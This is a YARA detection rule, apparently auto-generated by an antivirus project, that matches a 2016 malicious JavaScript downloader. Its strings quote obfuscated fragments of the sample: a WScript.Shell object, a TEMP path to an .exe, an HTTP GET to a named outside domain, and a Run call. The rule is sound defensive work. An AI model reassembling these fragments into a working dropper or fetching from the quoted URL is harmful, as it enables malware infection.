rule sig_20160328_99fd6f28e3f7c5ef1e53b29b87de23ad {
  meta:
    description = "datamaliciousorder - file 20160328_99fd6f28e3f7c5ef1e53b29b87de23ad.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8a3d99a354a4a0e88f1884af7891a7a6f0d8d2d7f6cbc7f6224c3f905a675bf7"

  strings:
    $s1  = "function Aiywx() {return Mczfnb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"iZgVdPYW4.exe\";};" fullword ascii
    $s2  = "Mxumiijyj[Sjchywkenb](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Npuwquagn](Zyixgmol() * 11)} while (Mxumiijyj[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Mczfnb = function Iqsdcgspt() {return WScript[Yjlev](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ejgbaidegv(Wvjwxamp, Glmsvewc){return Wvjwxamp - Glmsvewc;};" fullword ascii
    $s6  = "function Lievqqqtyu() {return ((Uavftbsl == true) && (Uavftbsl == Giudst)) ? 1 : Dixupb;};" fullword ascii
    $s7  = "function Kkcfevueay(Nnuee){Mczfnb[\"Run\"](Nnuee, Dixupb, Dixupb);};" fullword ascii
    $s8  = "var Ngebbyo = false;" fullword ascii
    $s9  = "var Bwojqate = new this[\"Date\"]();" fullword ascii
    $s10 = "var Uavftbsl = false;" fullword ascii
    $s11 = " while (Jpyrjccnpr){" fullword ascii
    $s12 = "function Asuaydma(){return Yjlev;};" fullword ascii
    $s13 = "function Eksghnqdo(){return Jruocuta;};" fullword ascii
    $s14 = "var Giudst = false;" fullword ascii
    $s15 = "Uavftbsl = true; " fullword ascii
    $s16 = "return Ejgbaidegv(Boofnqsou, Vcqrght);" fullword ascii
    $s17 = "function Aafmtwu(Pfluv) {var Xrizb = (1, 2, 3, 4, 5, Pfluv); return Xrizb;};" fullword ascii
    $s18 = "function Zyixgmol(){return 22;};" fullword ascii
    $s19 = "function Qujtmgu()" fullword ascii
    $s20 = "Giudst = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}